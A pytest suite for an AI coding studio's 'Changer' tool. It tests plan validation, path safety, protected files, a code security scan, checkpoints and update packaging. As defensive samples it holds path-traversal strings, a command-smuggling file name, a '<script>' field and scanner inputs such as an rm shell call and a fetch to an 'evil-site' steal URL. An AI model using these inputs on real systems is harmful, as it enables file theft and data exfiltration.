"""The Changer under a lot of cases: plan checking, path safety, protected
files, the security scan, checkpoints, version bumps, update zips, every
owner button in every project state, the tool's guards, and whole runs."""

import asyncio
import hashlib
import json
import zipfile
from collections.abc import Mapping
from pathlib import Path

import httpx
import pytest

from free_claude_code.core.json_types import JsonObject, JsonValue
from free_claude_code.studio.changer import (
    Changer,
    ChangerError,
    bump_lock,
    bump_version,
)
from free_claude_code.studio.changer_projects import (
    ACTIVE,
    FINISHED,
    KINDS,
    MAX_MILESTONES,
    Checkpoints,
    PlanError,
    build_goal,
    estimate_tokens,
    fix_goal,
    known_hosts,
    needs_approval,
    overlapping,
    plan_goal,
    protected_files,
    read_plan,
    review_goal,
    scan,
)
from free_claude_code.studio.llm import ToolCall
from free_claude_code.studio.models import AgentRun, ChangeProject, Message
from free_claude_code.studio.service import StudioError
from free_claude_code.studio.tools import ToolContext
from tests.api.support import create_test_app

from .test_changer import LOCK, PYPROJECT, changer_for, make_app
from .test_changer_projects import LAB, quick_plan, settle, team, wire

STATUSES = (
    "planning",
    "choose",
    "awaiting_plan",
    "building",
    "paused",
    "awaiting_release",
    "done",
    "cancelled",
    "failed",
)


def milestone(title: str = "A", **extra: JsonValue) -> JsonObject:
    return {"title": title, "goal": f"do {title}", **extra}


def milestones_of(plan: Mapping[str, object]) -> list[dict[str, JsonValue]]:
    raw = plan.get("milestones")
    return [m for m in raw if isinstance(m, dict)] if isinstance(raw, list) else []


def two_plan(**extra: JsonValue) -> JsonObject:
    return {
        "size": "project",
        "kind": "feature",
        "summary": "Two steps.",
        "milestones": [milestone("A", files=[LAB]), milestone("B")],
        **extra,
    }


# ------------------------------------------------------------ plan paths


@pytest.mark.parametrize(
    ("given", "kept"),
    [
        ("src/a.py", "src/a.py"),
        ("./src/a.py", "src/a.py"),
        ("././src/a.py", "src/a.py"),
        ("src\\free\\a.py", "src/free/a.py"),
        ("README.md", "README.md"),
        ("scripts/start-fcc.ps1", "scripts/start-fcc.ps1"),
        ("src/x/.hidden", "src/x/.hidden"),
        ("src/a..b.py", "src/a..b.py"),
        ("a_b/c-d/e.f.g", "a_b/c-d/e.f.g"),
    ],
)
def test_good_paths_are_kept_tidy(given, kept):
    plan = read_plan({"milestones": [milestone(files=[given])], "files": [given]})
    assert plan["files"] == [kept]


@pytest.mark.parametrize(
    "bad",
    [
        "../x.py",
        "src/../../x.py",
        "src/..",
        "/etc/passwd",
        "C:/Windows/x.py",
        "C:\\Windows\\x.py",
        "\\\\server\\share\\x",
        "src/a b.py",
        "src/$(rm).py",
        "src/a;b.py",
        "~/x.py",
        "src/" + "a" * 250,
        "src/x\n.py",
        ".",
        "./",
    ],
)
def test_paths_outside_the_copy_are_refused(bad):
    with pytest.raises(PlanError):
        read_plan({"milestones": [milestone(files=[bad])]})


def test_a_bad_top_level_path_is_refused_too():
    with pytest.raises(PlanError):
        read_plan({"milestones": [milestone()], "files": ["../secrets"]})


def test_blank_paths_are_dropped():
    plan = read_plan({"milestones": [milestone(files=["", "  ", "src/a.py"])]})
    milestones = plan["milestones"]
    assert isinstance(milestones, list) and isinstance(milestones[0], dict)
    assert milestones[0]["files"] == ["src/a.py"]


# ------------------------------------------------------------ plan shape


@pytest.mark.parametrize(
    ("size", "count", "expected"),
    [
        ("quick", 1, "quick"),
        ("quick", 2, "project"),
        ("project", 1, "project"),
        ("project", 3, "project"),
        ("", 1, "quick"),
        ("", 2, "project"),
        ("QUICK", 1, "quick"),
        (" Project ", 1, "project"),
        ("huge", 1, "quick"),
        ("huge", 5, "project"),
    ],
)
def test_the_size_follows_the_milestones(size, count, expected):
    plan = read_plan(
        {"size": size, "milestones": [milestone(str(n)) for n in range(count)]}
    )
    assert plan["size"] == expected


@pytest.mark.parametrize("kind", [*KINDS, "nonsense", "", "Feature"])
def test_kinds_are_from_the_list(kind):
    plan = read_plan({"kind": kind, "milestones": [milestone()]})
    assert plan["kind"] == (kind if kind in KINDS else "feature")


@pytest.mark.parametrize(
    "item",
    [
        {"title": "", "goal": "x"},
        {"title": "x", "goal": ""},
        {"title": "  ", "goal": "  "},
        {"goal": "x"},
        {"title": "x"},
    ],
)
def test_a_milestone_needs_a_title_and_goal(item):
    with pytest.raises(PlanError, match="title and a goal"):
        read_plan({"milestones": [item]})


def test_milestones_are_capped():
    plan = read_plan({"milestones": [milestone(str(n)) for n in range(40)]})
    milestones = plan["milestones"]
    assert isinstance(milestones, list) and len(milestones) == MAX_MILESTONES


def test_odd_milestone_items_are_skipped():
    plan = read_plan({"milestones": ["text", 3, None, milestone()]})
    milestones = plan["milestones"]
    assert isinstance(milestones, list) and len(milestones) == 1


def test_new_milestones_start_waiting_with_no_fixes():
    plan = read_plan({"milestones": [milestone()]})
    milestones = plan["milestones"]
    assert isinstance(milestones, list)
    first = milestones[0]
    assert isinstance(first, dict)
    assert first["status"] == "waiting" and first["fixes"] == 0
    assert first["review"] == "" and first["checkpoint"] == ""


@pytest.mark.parametrize(
    "raw",
    [
        {},
        {"milestones": []},
        {"milestones": "build it"},
        {"suggestions": []},
        {"suggestions": [{"title": ""}]},
        {"suggestions": "be better"},
    ],
)
def test_a_plan_with_nothing_to_do_is_refused(raw):
    with pytest.raises(PlanError):
        read_plan(raw)


def test_suggestions_are_capped_at_three():
    plan = read_plan({"suggestions": [{"title": f"S{n}"} for n in range(9)]})
    suggestions = plan["suggestions"]
    assert isinstance(suggestions, list) and len(suggestions) == 3


def test_suggestions_are_dropped_when_there_are_milestones():
    plan = read_plan({"milestones": [milestone()], "suggestions": [{"title": "S"}]})
    assert plan["suggestions"] == []


def test_suggestions_keep_only_known_fields():
    plan = read_plan(
        {"suggestions": [{"title": "Dark mode", "why": "eyes", "evil": "<script>"}]}
    )
    suggestions = plan["suggestions"]
    assert isinstance(suggestions, list)
    assert suggestions[0] == {
        "title": "Dark mode",
        "why": "eyes",
        "value": "",
        "effort": "",
        "risk": "",
    }


def test_long_text_is_cut():
    plan = read_plan(
        {
            "summary": "s" * 9000,
            "spec": "p" * 9000,
            "milestones": [{"title": "t" * 500, "goal": "g" * 9000}],
        }
    )
    milestones = plan["milestones"]
    assert isinstance(milestones, list) and isinstance(milestones[0], dict)
    assert len(str(plan["summary"])) == 1500 and len(str(plan["spec"])) == 6000
    assert len(str(milestones[0]["title"])) == 160
    assert len(str(milestones[0]["goal"])) == 3000


def test_risks_and_tests_are_lists_of_text():
    plan = read_plan(
        {
            "risks": ["a", "", 3],
            "tests": "not a list",
            "milestones": [milestone(tests=["t1", "  "])],
        }
    )
    assert plan["risks"] == ["a", "3"] and plan["tests"] == []


# ------------------------------------------------------------ protected files


@pytest.mark.parametrize(
    ("path", "protected"),
    [
        ("src/free_claude_code/studio/trading/desk.py", True),
        ("src/free_claude_code/studio/trading/brokers/alpaca.py", True),
        ("src/free_claude_code/studio/farm/pipeline.py", True),
        ("src/free_claude_code/api/studio_static/farm.js", True),
        ("src/free_claude_code/api/studio_static/farm.css", True),
        ("src/free_claude_code/studio/keyvault.py", True),
        ("src/free_claude_code/studio/vault.py", True),
        ("src/free_claude_code/studio/connectors.py", True),
        ("src/free_claude_code/api/admin_security.py", True),
        ("config/settings.py", True),
        ("src/free_claude_code/config/env.py", True),
        ("src/free_claude_code/studio/lab.py", False),
        ("src/free_claude_code/api/studio_static/trade.js", False),
        ("src/free_claude_code/api/studio_static/farmhouse.js", False),
        ("README.md", False),
        ("src/free_claude_code/studio/changer.py", False),
    ],
)
def test_protected_files_need_the_owner(path, protected):
    plan = read_plan({"size": "quick", "milestones": [milestone(files=[path])]})
    assert (protected_files(plan) == [path]) is protected
    assert needs_approval(plan) is protected


def test_project_plans_always_need_approval():
    assert needs_approval(read_plan(two_plan()))


def test_protected_files_are_listed_once_and_sorted():
    trading = "src/free_claude_code/studio/trading/desk.py"
    farm = "src/free_claude_code/studio/farm/a.py"
    plan = read_plan(
        {
            "files": [trading],
            "milestones": [milestone(files=[farm, trading]), milestone("B")],
        }
    )
    assert protected_files(plan) == sorted([farm, trading])


# ------------------------------------------------------------ helpers' files


@pytest.mark.parametrize(
    ("owned", "files", "shared"),
    [
        ([], ["a"], []),
        ([["a"]], ["a"], ["a"]),
        ([["a"], ["b"]], ["b", "c"], ["b"]),
        ([["a", "b"]], ["c"], []),
        ([["a"]], [], []),
        ([["z", "a"], ["m"]], ["m", "z"], ["m", "z"]),
    ],
)
def test_overlapping_files(owned, files, shared):
    assert overlapping(owned, files) == shared


# ------------------------------------------------------------ security scan


@pytest.mark.parametrize(
    ("line", "label"),
    [
        ("KEY = 'nvapi-" + "a" * 30 + "'", "key or token"),
        ("KEY = 'sk-" + "A" * 30 + "'", "key or token"),
        ("KEY = 'ghp_" + "a" * 30 + "'", "key or token"),
        ("KEY = 'gho_" + "a" * 30 + "'", "key or token"),
        ("KEY = 'AIza" + "a" * 35 + "'", "key or token"),
        ("PEM = '-----BEGIN RSA PRIVATE KEY-----'", "key or token"),
        ("eval(text)", "eval/exec"),
        ("exec (code)", "eval/exec"),
        ("subprocess.run(cmd, shell=True)", "shell command"),
        ("os.system('rm ' + name)", "shell command"),
        ("os.popen(cmd)", "shell command"),
        ("httpx.get(url, verify=False)", "certificate"),
        ("pickle.loads(blob)", "pickle/yaml"),
        ("pickle.load(f)", "pickle/yaml"),
        ("yaml.load(text)", "pickle/yaml"),
        ("open('../../etc/passwd')", "climbs out"),
        ("x = 1  # type: ignore", "switched off"),
        ("x = 1  # noqa", "switched off"),
        ("SKIP_SAFETY = True", "switched off"),
        ("fetch('https://evil-site.io/steal')", "new web address"),
    ],
)
def test_the_scan_flags_risky_new_lines(tmp_path, line, label):
    (tmp_path / "a.py").write_text(f"{line}\n")
    hits = scan(tmp_path, ["a.py"], known_hosts=frozenset({"github.com"}))
    assert any(label in hit for hit in hits), hits
    assert hits[0].startswith("a.py line 1:")


@pytest.mark.parametrize(
    "line",
    [
        "x = evaluate(text)",
        "def execute(self): pass",
        "subprocess.run(['ls'], shell=False)",
        "httpx.get(url, verify=True)",
        "json.loads(blob)",
        "yaml.safe_load(text)",
        "path = root / 'a' / 'b'",
        "url = 'https://github.com/x/y'",
        "url = 'https://api.github.com/x'",
        "token = settings.token  # read from the vault",
    ],
)
def test_the_scan_leaves_safe_lines_alone(tmp_path, line):
    (tmp_path / "a.py").write_text(f"{line}\n")
    assert scan(tmp_path, ["a.py"], known_hosts=frozenset({"github.com"})) == []


def test_the_scan_flags_page_html(tmp_path):
    (tmp_path / "a.js").write_text(
        "box.innerHTML = text;\nbox.insertAdjacentHTML('x', y);\n"
    )
    hits = scan(tmp_path, ["a.js"])
    assert len([h for h in hits if "as HTML" in h]) == 2


def test_old_lines_dont_count(tmp_path):
    source, target = tmp_path / "source", tmp_path / "target"
    source.mkdir()
    target.mkdir()
    (source / "a.py").write_text("eval(x)\n")
    (target / "a.py").write_text("eval(x)\nexec(y)\n")
    hits = scan(target, ["a.py"], source=source)
    assert hits == ["a.py line 2: code run from text (eval/exec)"]


@pytest.mark.parametrize(
    "name",
    [
        "notes.md",
        "keys.txt",
        "config.yml",
        "config.yaml",
        "app.env",
        "a.ini",
        ".ENV",
        "notes.rst",
        "secrets.key",
        ".npmrc",
        "Dockerfile",
    ],
)
def test_keys_are_caught_in_any_text_file(tmp_path, name):
    (tmp_path / name).write_text("token: ghp_" + "a" * 30 + "\n")
    hits = scan(tmp_path, [name])
    assert any("key or token" in hit for hit in hits), hits


def test_text_files_only_get_the_key_check(tmp_path):
    (tmp_path / "notes.md").write_text("Never call eval( on input.\n")
    assert scan(tmp_path, ["notes.md"]) == []


def test_binary_and_missing_files_get_no_false_alarms(tmp_path):
    (tmp_path / "a.png").write_bytes(b"\x89PNG eval(")
    (tmp_path / "b.py").write_bytes(b"\xff\xfe\x00bad")
    assert scan(tmp_path, ["a.png", "b.py", "gone.py"]) == []


@pytest.mark.parametrize("name", ["a.py", "a.js", "a.html", "a.png", "a.bin"])
@pytest.mark.parametrize("noise", [b"\x00", b"\xff\xfe", b"\x89PNG\r\n"])
def test_odd_bytes_cant_hide_a_key(tmp_path, name, noise):
    key = b"KEY = 'ghp_" + b"a" * 30 + b"'\n"
    (tmp_path / name).write_bytes(noise + b"\n" + key)
    hits = scan(tmp_path, [name])
    assert any("key or token" in hit for hit in hits), hits


def test_odd_bytes_dont_switch_off_the_code_checks(tmp_path):
    (tmp_path / "a.py").write_bytes(b"\x00\nos.system(cmd)\n")
    assert any("shell command" in hit for hit in scan(tmp_path, ["a.py"]))


def test_the_scan_is_capped(tmp_path):
    (tmp_path / "a.py").write_text("eval(x)\n" * 500)
    assert len(scan(tmp_path, ["a.py"])) == 80


def test_known_hosts_come_from_the_app(tmp_path):
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "a.py").write_text("URL = 'https://api.nvidia.com/v1'\n")
    hosts = known_hosts(tmp_path)
    assert "api.nvidia.com" in hosts and "nvidia.com" in hosts
    assert "localhost" in known_hosts(None)
    (tmp_path / "b.py").write_text("u = 'https://build.nvidia.com/x'\n")
    assert scan(tmp_path, ["b.py"], known_hosts=hosts) == []


# ------------------------------------------------------------ version bumps


@pytest.mark.parametrize(
    ("version", "minor", "new"),
    [
        ("6.78.0", False, "6.78.1"),
        ("6.78.9", False, "6.78.10"),
        ("6.78.3", True, "6.79.0"),
        ("1.0.0", True, "1.1.0"),
        ("0.9.99", False, "0.9.100"),
        ("10.99.5", True, "10.100.0"),
    ],
)
def test_versions_go_up(version, minor, new):
    text = f'[project]\nname = "x"\nversion = "{version}"\n'
    bumped, old, made = bump_version(text, minor=minor)
    assert (old, made) == (version, new) and f'version = "{new}"' in bumped


def test_no_version_line_is_an_error():
    with pytest.raises(ChangerError):
        bump_version("[project]\nname = 'x'\n")


def test_the_lock_moves_only_fcc():
    moved = bump_lock(LOCK, "6.75.0", "6.75.1")
    assert 'name = "aiohttp"\nversion = "6.75.0"' in moved
    assert 'name = "free-claude-code"\nversion = "6.75.1"' in moved


# ------------------------------------------------------------ checkpoints


def make_points(tmp_path: Path) -> tuple[Changer, Path, Path, Checkpoints]:
    changer, source, target = changer_for(tmp_path)
    return changer, source, target, Checkpoints(tmp_path / "points", source=source)


def test_restore_brings_back_changed_files(tmp_path):
    changer, _, target, points = make_points(tmp_path)
    lab = target / LAB
    lab.write_text("v1\n")
    first = points.save(target, changer.baseline(), "one")
    lab.write_text("v2\n")
    assert points.restore(target, str(first["id"])) == 1
    assert lab.read_text() == "v1\n"


def test_restore_removes_files_added_since(tmp_path):
    changer, _, target, points = make_points(tmp_path)
    first = points.save(target, changer.baseline(), "one")
    extra = target / "src/free_claude_code/studio/new.py"
    extra.write_text("x\n")
    points.restore(target, str(first["id"]))
    assert not extra.exists()


def test_restore_brings_back_deleted_files(tmp_path):
    changer, source, target, points = make_points(tmp_path)
    first = points.save(target, changer.baseline(), "one")
    (target / LAB).unlink()
    points.restore(target, str(first["id"]))
    assert (target / LAB).read_text() == (source / LAB).read_text()


def test_restore_puts_back_the_apps_own_version(tmp_path):
    changer, source, target, points = make_points(tmp_path)
    first = points.save(target, changer.baseline(), "clean")
    (target / LAB).write_text("changed later\n")
    points.restore(target, str(first["id"]))
    assert (target / LAB).read_text() == (source / LAB).read_text()


def test_restore_twice_changes_nothing_the_second_time(tmp_path):
    changer, _, target, points = make_points(tmp_path)
    (target / LAB).write_text("v1\n")
    first = points.save(target, changer.baseline(), "one")
    (target / LAB).write_text("v2\n")
    points.restore(target, str(first["id"]))
    assert points.restore(target, str(first["id"])) == 0


def test_checkpoints_made_together_get_their_own_ids(tmp_path, monkeypatch):
    changer, _, target, points = make_points(tmp_path)
    monkeypatch.setattr("time.time", lambda: 1_000.0)  # every save in one instant
    ids = {
        str(points.save(target, changer.baseline(), str(n))["id"]) for n in range(20)
    }
    assert len(ids) == 20


def test_each_checkpoint_keeps_its_own_files(tmp_path):
    changer, _, target, points = make_points(tmp_path)
    (target / LAB).write_text("one\n")
    first = points.save(target, changer.baseline(), "one")
    (target / LAB).write_text("two\n")
    second = points.save(target, changer.baseline(), "two")
    points.restore(target, str(first["id"]))
    assert (target / LAB).read_text() == "one\n"
    points.restore(target, str(second["id"]))
    assert (target / LAB).read_text() == "two\n"


@pytest.mark.parametrize("bad", ["", "cp", "../cp1", "cp1/../../x", "x123", "cp12a"])
def test_bad_checkpoint_names_are_refused(tmp_path, bad):
    _, _, target, points = make_points(tmp_path)
    with pytest.raises(ChangerError, match="isn't a checkpoint"):
        points.restore(target, bad)


def test_a_missing_checkpoint_is_reported(tmp_path):
    _, _, target, points = make_points(tmp_path)
    with pytest.raises(ChangerError, match="gone"):
        points.restore(target, "cp123")


# ------------------------------------------------------------ goals


def project_dict(**extra: JsonValue) -> JsonObject:
    return {"request": "Add dark mode", "plan": read_plan(two_plan()), **extra}


def test_the_build_goal_names_the_milestone_and_files():
    goal = build_goal(project_dict(), 0)
    assert "BUILD milestone 1 of 2" in goal and LAB in goal
    assert "Add dark mode" in goal and "Don't package" in goal
    assert "as needed" in build_goal(project_dict(), 1)


def test_the_review_goal_differs_for_security():
    code = review_goal(project_dict(), 0, "diff", security=False)
    secure = review_goal(project_dict(), 0, "diff", security=True)
    assert "CODE review" in code and "SECURITY review" in secure
    assert "You did not write it" in code


def test_long_diffs_and_problems_are_cut():
    goal = review_goal(project_dict(), 0, "x" * 100_000, security=False)
    assert goal.count("x") < 25_000
    assert fix_goal(project_dict(), 0, "p" * 50_000).count("p") < 4_100


def test_plan_goal_carries_the_owners_notes():
    assert "notes on the last plan: smaller" in plan_goal("x", "smaller")
    assert "notes on the last plan" not in plan_goal("x", "  ")


@pytest.mark.parametrize(
    ("texts", "tokens"), [([], 0), (["abcd"], 1), (["ab", "cd"], 1), (["x" * 400], 100)]
)
def test_token_estimates(texts, tokens):
    assert estimate_tokens(texts) == tokens


# ------------------------------------------------------------ update zips


def packed(tmp_path: Path, *, minor: bool = False) -> tuple[JsonObject, Changer, Path]:
    changer, _, target = changer_for(tmp_path)
    (target / LAB).write_text("def mix():\n    return 'bubbles'\n")
    added = target / "src/free_claude_code/studio/new.py"
    added.write_text("NEW = 1\n")
    (target / "src/free_claude_code/studio/page.js").unlink()
    made = changer.package(
        target, "Bubbles.", minor=minor, report="# Report\nok", manifest={"x": 1}
    )
    return made, changer, target


def zip_names(path: Path) -> set[str]:
    with zipfile.ZipFile(path) as archive:
        return set(archive.namelist())


def test_the_zip_carries_changed_and_added_files(tmp_path):
    made, changer, _ = packed(tmp_path)
    names = zip_names(changer.updates_dir / str(made["name"]))
    assert f"fcc/{LAB}" in names
    assert "fcc/src/free_claude_code/studio/new.py" in names
    assert "fcc/pyproject.toml" in names and "fcc/uv.lock" in names
    assert "fcc/src/free_claude_code/studio/page.js" not in names


def test_the_zip_has_all_its_paperwork(tmp_path):
    made, changer, _ = packed(tmp_path)
    papers = f"fcc/_update/{made['version']}/"
    names = zip_names(changer.updates_dir / str(made["name"]))
    for paper in (
        "CHANGELOG.md",
        "UPDATE_INSTRUCTIONS.md",
        "MANIFEST.json",
        "SHA256SUMS.txt",
        "TEST-REPORT.md",
    ):
        assert papers + paper in names


def test_the_checksums_match_the_files(tmp_path):
    made, changer, _ = packed(tmp_path)
    with zipfile.ZipFile(changer.updates_dir / str(made["name"])) as archive:
        sums = archive.read(f"fcc/_update/{made['version']}/SHA256SUMS.txt").decode()
        lines = [line.split("  ", 1) for line in sums.splitlines()]
        assert lines
        for digest, relative in lines:
            assert hashlib.sha256(archive.read(f"fcc/{relative}")).hexdigest() == digest


def test_the_manifest_records_the_change(tmp_path):
    made, changer, _ = packed(tmp_path, minor=True)
    with zipfile.ZipFile(changer.updates_dir / str(made["name"])) as archive:
        record = json.loads(
            archive.read(f"fcc/_update/{made['version']}/MANIFEST.json")
        )
    assert record["from"] == "6.75.0" and record["to"] == "6.76.0"
    assert record["kind"] == "project" and record["x"] == 1
    assert record["deleted"] == ["src/free_claude_code/studio/page.js"]
    assert "src/free_claude_code/studio/new.py" in record["added"]


def test_the_instructions_list_files_to_delete(tmp_path):
    made, changer, _ = packed(tmp_path)
    with zipfile.ZipFile(changer.updates_dir / str(made["name"])) as archive:
        text = archive.read(
            f"fcc/_update/{made['version']}/UPDATE_INSTRUCTIONS.md"
        ).decode()
    assert "page.js" in text


def test_the_rollback_zip_holds_the_originals(tmp_path):
    made, changer, _ = packed(tmp_path)
    with zipfile.ZipFile(changer.updates_dir / str(made["backup"])) as archive:
        assert archive.read(f"fcc/{LAB}").decode() == "def mix():\n    return 'fizz'\n"
        assert "fcc/src/free_claude_code/studio/page.js" in archive.namelist()
        undo = archive.read("fcc/FCC-UNDO.txt").decode()
    assert "src/free_claude_code/studio/new.py" in undo


def test_a_quick_zip_bumps_the_patch(tmp_path):
    made, _, target = packed(tmp_path)
    assert made["version"] == "6.75.1"
    assert 'version = "6.75.1"' in (target / "pyproject.toml").read_text()


def test_nothing_changed_means_no_zip(tmp_path):
    changer, _, target = changer_for(tmp_path)
    with pytest.raises(ChangerError, match="Nothing has changed"):
        changer.package(target, "")


def test_zip_names_are_checked_before_download(tmp_path):
    made, changer, _ = packed(tmp_path)
    assert changer.update_file(str(made["name"])).is_file()
    for bad in ("../x.zip", "FCC-Studio-update-1-2.zip.exe", str(made["name"]) + "/"):
        with pytest.raises(ChangerError):
            changer.update_file(bad)


# ------------------------------------------------------------ owner buttons


def keep_driving(studio, monkeypatch) -> list[str]:
    """Stand in for the driver: record each start and look busy."""
    driven: list[str] = []
    loop = asyncio.get_running_loop()

    def drive(project_id: str) -> None:
        driven.append(project_id)
        studio._changer_driver = loop.create_future()

    monkeypatch.setattr(studio, "_drive", drive)
    studio._changer_driver = loop.create_future()
    return driven


async def project_in(
    studio, tmp_path, status: str, *, approved: bool = True
) -> tuple[ChangeProject, JsonObject]:
    wire(studio, tmp_path)
    await studio.changer_fresh_copy()
    target = await studio._changer_target()
    point = await asyncio.to_thread(
        studio._changer_checkpoints.save,
        target,
        studio._changer.baseline(),
        "Before milestone 1: A",
    )
    point["milestone"] = 0
    plan = {
        **read_plan(two_plan()),
        "approved": approved,
        "suggestions": [{"title": "Dark mode", "why": "eyes"}],
    }
    project = ChangeProject(
        request="x", status=status, plan=plan, checkpoints=[point], note="before"
    )
    await studio._store.put(project)
    return project, point


ALLOWED: dict[str, dict[str, str]] = {
    "approve": {"awaiting_plan": "building"},
    "replan": dict.fromkeys(("choose", "awaiting_plan", "paused"), "planning"),
    "choose": {"choose": "planning"},
    "pause": {"planning": "paused", "building": "paused"},
    "resume": {"paused": "building"},
    "cancel": {s: "cancelled" for s in STATUSES if s not in FINISHED},
    "rollback": {
        s: (s if s in FINISHED else "paused") for s in STATUSES if s not in ACTIVE
    },
}
DRIVES = {"approve", "replan", "choose", "resume"}


@pytest.mark.asyncio
@pytest.mark.parametrize("status", STATUSES)
@pytest.mark.parametrize("action", sorted(ALLOWED))
async def test_every_button_in_every_state(
    make_studio, tmp_path, monkeypatch, action, status
):
    studio, _ = make_studio([])
    project, point = await project_in(studio, tmp_path, status)
    driven = keep_driving(studio, monkeypatch)
    choices: dict[str, dict[str, object]] = {
        "approve": {},
        "replan": {"feedback": "smaller"},
        "choose": {"index": 0},
        "pause": {},
        "resume": {},
        "cancel": {},
        "rollback": {"checkpoint": point["id"]},
    }
    options = choices[action]
    expected = ALLOWED[action].get(status)
    if expected is None:
        with pytest.raises(StudioError):
            await studio.changer_act(action, **options)
        after = await studio._store.require(ChangeProject, project.id)
        assert after.status == status and after.note == "before"
        assert driven == []
        return
    view = await studio.changer_act(action, **options)
    after = await studio._store.require(ChangeProject, project.id)
    assert after.status == expected, after.note
    shown = view["project"]
    assert isinstance(shown, dict) and shown["status"] == expected
    assert bool(driven) is (action in DRIVES)
    if action == "rollback":
        assert ("Resume" in after.note) is (expected == "paused")


@pytest.mark.asyncio
async def test_an_unknown_button_is_refused(make_studio, tmp_path):
    studio, _ = make_studio([])
    await project_in(studio, tmp_path, "paused")
    with pytest.raises(StudioError, match="Unknown"):
        await studio.changer_act("explode")


@pytest.mark.asyncio
async def test_buttons_need_a_project(make_studio, tmp_path):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    with pytest.raises(StudioError, match="no update project"):
        await studio.changer_act("pause")


@pytest.mark.asyncio
@pytest.mark.parametrize("index", [-1, 1, 5, "0", None, True, 0.0])
async def test_choose_needs_a_real_suggestion(
    make_studio, tmp_path, monkeypatch, index
):
    studio, _ = make_studio([])
    project, _ = await project_in(studio, tmp_path, "choose")
    keep_driving(studio, monkeypatch)
    with pytest.raises(StudioError, match="Pick one"):
        await studio.changer_act("choose", index=index)
    after = await studio._store.require(ChangeProject, project.id)
    assert after.status == "choose"


@pytest.mark.asyncio
async def test_choosing_makes_the_suggestion_the_request(
    make_studio, tmp_path, monkeypatch
):
    studio, _ = make_studio([])
    project, _ = await project_in(studio, tmp_path, "choose")
    keep_driving(studio, monkeypatch)
    await studio.changer_act("choose", index=0)
    after = await studio._store.require(ChangeProject, project.id)
    assert after.request == "Dark mode: eyes" and after.plan == {}


@pytest.mark.asyncio
@pytest.mark.parametrize("checkpoint", ["", "cp1", "nope", "../cp1"])
async def test_rollback_needs_a_listed_checkpoint(
    make_studio, tmp_path, monkeypatch, checkpoint
):
    studio, _ = make_studio([])
    await project_in(studio, tmp_path, "paused")
    keep_driving(studio, monkeypatch)
    with pytest.raises(StudioError, match="Pick a checkpoint"):
        await studio.changer_act("rollback", checkpoint=checkpoint)


@pytest.mark.asyncio
async def test_rollback_resets_the_milestones_from_its_point(
    make_studio, tmp_path, monkeypatch
):
    studio, _ = make_studio([])
    project, point = await project_in(studio, tmp_path, "paused")
    keep_driving(studio, monkeypatch)
    plan = dict(project.plan)
    milestones = [dict(m) for m in milestones_of(plan)]
    for item in milestones:
        item.update(status="done", review="ok", checkpoint="cp9")
    await studio._save_project(
        project, owner=True, plan={**plan, "milestones": milestones}, milestone=2
    )
    await studio.changer_act("rollback", checkpoint=point["id"])
    after = await studio._store.require(ChangeProject, project.id)
    assert after.milestone == 0
    assert all(
        isinstance(m, dict) and m["status"] == "waiting" and m["checkpoint"] == ""
        for m in after.plan["milestones"]
    )


@pytest.mark.asyncio
async def test_replan_keeps_the_owners_notes_for_the_planner(
    make_studio, tmp_path, monkeypatch
):
    studio, _ = make_studio([])
    project, _ = await project_in(studio, tmp_path, "awaiting_plan")
    keep_driving(studio, monkeypatch)
    await studio.changer_act("replan", feedback="  only the Lab  ")
    after = await studio._store.require(ChangeProject, project.id)
    assert after.note == "only the Lab" and after.plan == {} and after.milestone == 0


@pytest.mark.asyncio
async def test_approve_marks_the_plan_approved(make_studio, tmp_path, monkeypatch):
    studio, _ = make_studio([])
    project, _ = await project_in(studio, tmp_path, "awaiting_plan", approved=False)
    keep_driving(studio, monkeypatch)
    await studio.changer_act("approve")
    after = await studio._store.require(ChangeProject, project.id)
    assert after.plan["approved"] is True


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("plan", "expected"),
    [
        ({}, "planning"),
        ({"suggestions": [{"title": "Dark mode"}]}, "choose"),
        ({"milestones": [milestone()], "approved": False}, "awaiting_plan"),
        ({"milestones": [milestone()], "approved": True}, "building"),
        ({"milestones": [milestone()]}, "building"),
    ],
)
async def test_resume_goes_back_to_the_right_step(
    make_studio, tmp_path, monkeypatch, plan, expected
):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    keep_driving(studio, monkeypatch)
    project = ChangeProject(request="x", status="paused", plan=plan)
    await studio._store.put(project)
    await studio.changer_act("resume")
    after = await studio._store.require(ChangeProject, project.id)
    assert after.status == expected


@pytest.mark.asyncio
@pytest.mark.parametrize("held", ["paused", "cancelled"])
@pytest.mark.parametrize(
    "driver_status", ["building", "awaiting_release", "awaiting_plan", "failed"]
)
async def test_the_driver_never_overrides_the_owner(
    make_studio, tmp_path, held, driver_status
):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    project = ChangeProject(request="x", status="building")
    await studio._store.put(project)
    await studio._save_project(project, owner=True, status=held, note="mine")
    after = await studio._save_project(
        project, status=driver_status, note="driver", milestone=3
    )
    assert after.status == held and after.note == "mine" and after.milestone == 3


@pytest.mark.asyncio
async def test_a_restart_mid_build_waits_for_resume(make_studio, tmp_path):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    for status in ("planning", "building"):
        await studio._store.put(ChangeProject(request=status, status=status))
        view = await studio.changer_view()
        shown = view["project"]
        assert isinstance(shown, dict) and shown["status"] == "paused"
        assert "Press Resume" in str(shown["note"])


# ------------------------------------------------------------ starting


@pytest.mark.asyncio
@pytest.mark.parametrize("request_text", ["", "   ", "\n\t"])
async def test_an_empty_request_is_refused(make_studio, tmp_path, request_text):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    with pytest.raises(StudioError, match="Say what"):
        await studio.changer_start(request_text)


@pytest.mark.asyncio
@pytest.mark.parametrize("status", sorted(ACTIVE))
async def test_one_change_at_a_time(make_studio, tmp_path, monkeypatch, status):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    keep_driving(studio, monkeypatch)
    await studio._store.put(ChangeProject(request="x", status=status))
    with pytest.raises(StudioError, match="already working"):
        await studio.changer_start("another")
    with pytest.raises(StudioError, match="working"):
        await studio.changer_fresh_copy()


@pytest.mark.asyncio
async def test_a_start_makes_the_copy_and_keeps_the_budget(
    make_studio, tmp_path, monkeypatch
):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    driven = keep_driving(studio, monkeypatch)
    started = await studio.changer_start("  Make it blue  ", budget=123_456)
    project = await studio._store.require(ChangeProject, str(started["project_id"]))
    assert project.request == "Make it blue" and project.budget == 123_456
    assert project.status == "planning" and driven == [project.id]
    assert await studio._changer_copy() is not None


# ------------------------------------------------------------ whole runs


